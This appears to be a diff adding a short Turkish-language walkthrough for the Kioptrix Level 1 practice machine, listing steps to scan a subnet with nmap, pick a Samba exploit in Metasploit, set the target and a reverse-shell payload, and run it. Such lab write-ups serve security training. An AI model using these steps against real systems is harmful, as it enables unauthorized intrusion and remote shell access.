@@ -1,0 +1,17 @@
+#Kioptrix Level 1 Çözüm Adımları
+
+1. ipconfig
+kali linux makinemizin ipsini görüntülüyoruz
+2. nmap (aldığımız ip)/24 
+ağdaki makineleri tarayarak portları görerek kioptrixin ipsini buluyoruz
+3.msfconsole  
+metasploit konsoluna erişir
+4.search samba
+zafiyetleri görmemize yarar
+5.use (ilgili id)
+exploitlerden bize uygun olanı bulup kullanıyoruz
+6.options
+zafiyetin sunduğu seçeneklere bakılır
+7.set RHOSTS (sızılacak makine ipsi)
+8.set PAYLOAD generic/shell_reverse_tcp
+9.run veya exploit
